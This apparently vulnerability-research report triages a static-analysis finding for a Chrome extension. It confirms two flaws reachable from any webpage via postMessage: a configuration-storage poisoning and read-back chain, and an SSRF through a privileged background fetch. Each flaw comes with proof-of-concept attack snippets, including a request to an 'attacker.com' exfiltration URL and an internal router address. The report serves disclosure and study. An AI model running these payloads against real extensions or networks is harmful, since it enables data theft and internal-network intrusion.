# CoCo Analysis: mpciibaagbcekmbilhhcjichpdcpmmaj

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2

---

## Sink 1: cs_window_eventListener_message → chrome_storage_sync_set_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/mpciibaagbcekmbilhhcjichpdcpmmaj/opgen_generated_files/cs_0.js
Line 747    window.addEventListener('message', function(event) {
Line 748    if (event.data.type === 'ELM_READY') {
Line 833    chrome.runtime.sendMessage({ greeting: "SaveConfig", config: event.data.configs }, function(response) {});

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/mpciibaagbcekmbilhhcjichpdcpmmaj/opgen_generated_files/bg.js
Line 1002   var value = JSON.stringify(request.config);
Line 1005   chrome.storage.sync.set({ "CpyToolConfig": value }).then(() => {
```

**Code:**

```javascript
// Content script - Entry point (cs_0.js Line 747-833)
window.addEventListener('message', function(event) {
    if (event.data.type === 'ELM_READY') {
        // ... code ...
        chrome.runtime.sendMessage({
            greeting: "SaveConfig",
            config: event.data.configs  // ← attacker-controlled
        }, function(response) {});
    }
});

// Background script - Message handler (bg.js Line 999-1010)
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    if(request.greeting === "SaveConfig") {
        cfgFromStorage = request.config;  // ← attacker-controlled
        var value = JSON.stringify(request.config);  // ← attacker-controlled
        chrome.storage.sync.set({ "CpyToolConfig": value }).then(() => {  // Storage poisoning sink
            sendResponse({result: "OK"});
        }).catch((error) => {
            sendResponse({result: "Error", error: error.message});
        });
        return true;
    }

    if(request.greeting === "LoadConfig") {
        if (cfgFromStorage.length > 0) {
            sendResponse({result: cfgFromStorage});  // ← Returns poisoned data to attacker
        } else {
            chrome.storage.sync.get(["CpyToolConfig"]).then((result) => {
                if (result.CpyToolConfig) {
                    cfgFromStorage = JSON.parse(result.CpyToolConfig);
                }
                sendResponse({result: cfgFromStorage});  // ← Returns poisoned data to attacker
            });
        }
        return true;
    }
});

// Content script - Attacker retrieves poisoned data (cs_0.js Line 834-840)
window.addEventListener('message', function(event) {
    if (event.data.type === 'LOAD_CONFIGS') {
        chrome.runtime.sendMessage({ greeting: "LoadConfig" }, function(response) {
            window.postMessage({
                type: 'CONFIGS_RESPONSE',
                result: response.result  // ← Poisoned data sent back to attacker
            }, '*');
        });
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage (ANY webpage can exploit via postMessage)

**Attack:**

```javascript
// Attacker's malicious webpage can poison storage
window.postMessage({
    type: 'ELM_READY',
    configs: ['<malicious data>', '<attacker payload>']
}, '*');

// Then retrieve the poisoned data
window.postMessage({
    type: 'LOAD_CONFIGS'
}, '*');

// Listen for the response containing poisoned data
window.addEventListener('message', function(event) {
    if (event.data.type === 'CONFIGS_RESPONSE') {
        console.log('Retrieved poisoned data:', event.data.result);
    }
});
```

**Impact:** Complete storage exploitation chain - attacker can poison chrome.storage.sync with arbitrary configuration data and retrieve it back via sendResponse and postMessage, achieving full read/write control over extension's configuration storage.

---

## Sink 2: cs_window_eventListener_message → fetch_resource_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/mpciibaagbcekmbilhhcjichpdcpmmaj/opgen_generated_files/cs_0.js
Line 747    window.addEventListener('message', function(event) {
Line 748    if (event.data.type === 'ELM_READY') {
Line 876    url: event.data.url

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/mpciibaagbcekmbilhhcjichpdcpmmaj/opgen_generated_files/cs_0.js
Line 876    url: event.data.url
```

**Code:**

```javascript
// Content script - Entry point (cs_0.js Line 747-910)
window.addEventListener('message', function(event) {
    if (event.data.type === 'FETCH_IMAGE_REQUEST') {
        // Relay the fetch request to background script
        chrome.runtime.sendMessage({
            type: 'fetchImage',
            url: event.data.url  // ← attacker-controlled URL
        }, response => {
            // ... process response ...
        });
    }
});

// Background script - Message handler (bg.js Line 1040-1068)
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    if (request.type === 'fetchImage') {
        fetch(request.url)  // ← SSRF sink with attacker-controlled URL
            .then(response => {
                if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
                return Promise.all([
                    response.blob(),
                    response.headers.get('content-type') || 'image/jpeg'
                ]);
            })
            .then(([blob, contentType]) => {
                const reader = new FileReader();
                reader.onloadend = () => {
                    sendResponse({
                        data: reader.result.split(',')[1],  // ← Response data sent back
                        type: contentType,
                        error: null
                    });
                };
                reader.readAsDataURL(blob);
            })
            .catch(error => {
                sendResponse({
                    data: null,
                    type: null,
                    error: error.message
                });
            });
        return true;
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage (ANY webpage can exploit via postMessage)

**Attack:**

```javascript
// Attacker can perform SSRF to internal resources or arbitrary URLs
window.postMessage({
    type: 'FETCH_IMAGE_REQUEST',
    url: 'http://192.168.1.1/admin',  // Internal network resource
    messageId: '123'
}, '*');

// Or exfiltrate to attacker server
window.postMessage({
    type: 'FETCH_IMAGE_REQUEST',
    url: 'https://attacker.com/collect?data=steal',
    messageId: '456'
}, '*');

// Listen for response containing fetched data
window.addEventListener('message', function(event) {
    if (event.data.type === 'FETCH_IMAGE_RESPONSE') {
        console.log('Fetched data:', event.data.data);
        console.log('Content type:', event.data.contentType);
    }
});
```

**Impact:** SSRF vulnerability with data exfiltration - attacker can make privileged cross-origin requests to arbitrary URLs (including internal network resources) and receive the response data back via sendResponse and postMessage, bypassing CORS restrictions.
